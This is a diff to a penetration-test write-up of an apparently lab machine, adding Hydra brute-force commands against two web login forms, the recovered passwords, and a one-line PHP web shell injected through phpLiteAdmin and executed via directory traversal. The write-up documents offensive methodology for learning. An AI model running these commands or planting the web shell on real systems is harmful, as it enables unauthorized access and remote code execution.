@@ -8,7 +8,9 @@
 
 ## 0. Lesson Learned
 
+Each time you get stuck, go back and review what you have already found. What are the loose ends?
 
+When testing directory traversal, remove file extensions and try treating the path like a directory, not a file.
 
 ---
 
@@ -94,6 +96,41 @@ Accessing `/info.php` disclosed sensitive system information, including:
 
 ## 6. Initial Access
 
+### Credential Brute Force - Department Login
+
+The `/department/login.php` page was identified as a login portal and `admin` was identified as a username based on login attempt responses. A brute-force attack was performed using Hydra against the HTTP POST login form:
+
+```
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.186.238 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password"
+```
+
+Valid credentials obtained:
+
+- Username: `admin`
+- Password: `1q2w3e4r5t`
+
+### phpLiteAdmin Authentication Bypass
+
+The `/db/` directory exposed phpLiteAdmin v1.9. A brute-force attack was performed against the password-only login form:
+
+```
+hydra -l '' -P /usr/share/wordlists/rockyou.txt 10.129.186.238 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password."
+```
+
+Valid password obtained:
+
+- `password123`
+
+### Remote Code Execution via phpLiteAdmin
+
+The installed phpLiteAdmin version was vulnerable to remote PHP code injection. A malicious database file containing PHP code was created:
+
+```
+<?php system($_REQUEST["cmd"]); ?>
+```
+
+The file was written to disk and later executed through a directory traversal vulnerability.
+
 ---
 
 ## 7. Post-Exploitation
@@ -113,3 +150,6 @@ Accessing `/info.php` disclosed sensitive system information, including:
 ---
 
 ## 11. Appendix
+
+phpLiteAdmin <= 1.9.3 - PHP Remote Code Execution:
+[https://www.exploit-db.com/exploits/24044](https://www.exploit-db.com/exploits/24044)
